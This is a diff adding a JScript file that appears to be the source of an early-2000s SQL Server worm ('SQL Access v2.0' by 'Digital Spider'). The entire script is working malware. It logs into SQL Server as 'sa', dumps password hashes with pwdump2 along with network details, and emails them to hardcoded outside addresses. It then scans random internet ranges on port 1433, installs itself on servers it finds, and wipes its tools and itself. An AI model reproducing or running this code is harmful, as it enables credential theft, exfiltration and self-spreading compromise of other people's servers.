@@ -1,0 +1,184 @@
+// SQL Access v2.0
+// Created 2001-2002 by Digital Spider
+
+threads = 10;
+
+if (WScript.Arguments.length == 0)
+ WScript.Quit();
+
+shell = new ActiveXObject("WScript.Shell");
+fs = new ActiveXObject("Scripting.FileSystemObject");
+
+clefile = shell.ExpandEnvironmentStrings("%SystemRoot%\\system32\\msver241.srq");
+path = fs.GetFile(WScript.ScriptFullName).ParentFolder + "\\";
+
+function random(min_number, max_number)
+ {
+  return min_number + Math.round((max_number - min_number) * Math.random());
+ }
+
+function password()
+ {
+  pass = "";
+
+  for (counter = 0;counter < 4;counter++)
+   pass += String.fromCharCode(random(97, 122)) + random(0, 9);
+  
+  return pass;
+ }
+
+function destroy(filename)
+ {
+  if (!fs.FileExists(filename))
+   return false;
+
+  file = fs.GetFile(filename);
+  tempname = file.Name = fs.GetTempName();
+  file.Delete(true);
+
+  newfile = fs.CreateTextFile(tempname, true);
+  newfile.Close();
+
+  file = fs.GetFile(tempname);
+  file.Delete(true);
+
+  return true;
+ }
+
+email = new Array("system@digitalspider.org",
+                  "system@hiddennet.org",
+                  "system@infinityspace.net");
+
+shell.Run("regsvr32 /s timer.dll", 0, true);
+
+oSQLServer = new ActiveXObject("SQLDMO.SQLServer");
+oSQLServer.Connect(".", "sa", WScript.Arguments(0));
+
+if (oSQLServer.VersionMajor == 7)
+ shell.RegWrite("HKLM\\software\\microsoft\\mssqlserver\\client\\connectto\\dsquery", "dbmssocn");
+
+oSQLServer.Close();
+
+fs.CopyFile(shell.ExpandEnvironmentStrings("%SystemRoot%\\system32\\regedt32.exe"), shell.ExpandEnvironmentStrings("%SystemRoot%\\"), true);
+
+destroy(clefile);
+
+shell.Run("cmd /c ipconfig /all > send.txt", 0, true);
+shell.Run("cmd /c cscript sqldir.js . sa " + WScript.Arguments(0) + " /r3s >> send.txt", 0, true);
+shell.Run("cmd /c pwdump2 >> send.txt", 0, true);
+shell.Run("clemail.exe -bodyfile send.txt -to " + email[random(0, email.length - 1)] + " -subject " + WScript.Arguments(0), 0, true);
+
+destroy(clefile);
+destroy(path + "send.txt");
+
+shell.Run("net use /persistent:no", 0);
+
+servers = 0;
+
+timer = new ActiveXObject("Timer.Sleep");
+
+do
+ {
+  networks = new Array();
+
+  for (counter = 0;counter < threads;counter++)
+   {
+    number = random(1, 223);
+
+    if (number == 10 || number == 127 || number == 172 || number == 192)
+     continue;
+ 
+    network = number + "." + random(0, 255) + "." + random(0, 255) + ".";
+    networks[networks.length] = network + "1";
+
+    shell.Run("drivers\\services " + network + "1 " + network + "254 1433", 0);
+   }
+
+  timecounter = 0;
+
+  do
+   {
+    timer.DoSleep(10000);
+
+    if (timecounter == 30)
+     break;
+
+    timecounter++;
+    flag = true;
+
+    for (counter = 0;counter < threads;counter++)
+     if (!fs.FileExists(path + networks[counter] + ".ok"))
+      {
+       flag = false;
+       break;
+      }
+   }
+  while (!flag)
+
+  result = "";
+
+  for (counter = 0;counter < threads;counter++)
+   {
+    destroy(path + networks[counter] + ".ok");
+
+    if (!fs.FileExists(path + networks[counter]))
+     continue;
+
+    file = fs.OpenTextFile(path + networks[counter], 1);
+    result += file.ReadAll();
+    file.Close();
+
+    destroy(path + networks[counter]);
+   }
+
+  file = fs.OpenTextFile(path + "sqlout.txt", 2, true);
+  file.Write(result);
+  file.Close();
+
+  sqlout = fs.OpenTextFile(path + "sqlout.txt", 1);
+
+  while (!sqlout.AtEndOfStream)
+   {
+    ip = sqlout.ReadLine();
+      
+    if (ip.length < 3)
+     continue;
+
+    shell.Run("sqlinstall.bat " + ip + " " + password(), 0);
+
+    timecounter = 0;
+
+    do
+     {
+      timer.DoSleep(5000);
+
+      if (timecounter == 60)
+       break;
+
+      timecounter++;
+      flag = true;
+
+      if (destroy(path + ip + ".ok"))
+       servers++;
+      else
+       if (!destroy(path + ip + ".fail"))
+        flag = false;
+     }
+    while (!flag)
+   }
+
+  sqlout.Close();
+  destroy(path + "sqlout.txt");
+ }
+while (servers < 10)
+
+destroy(path + "drivers\\services.exe");
+destroy(path + "sqlexec.exe");
+destroy(path + "clemail.exe");
+destroy(path + "sqlinstall.bat");
+destroy(path + "sqldir.js");
+destroy(path + "run.js");
+destroy(path + "samdump.dll");
+destroy(path + "pwdump2.exe");
+destroy(path + "timer.dll");
+destroy(WScript.ScriptFullName);
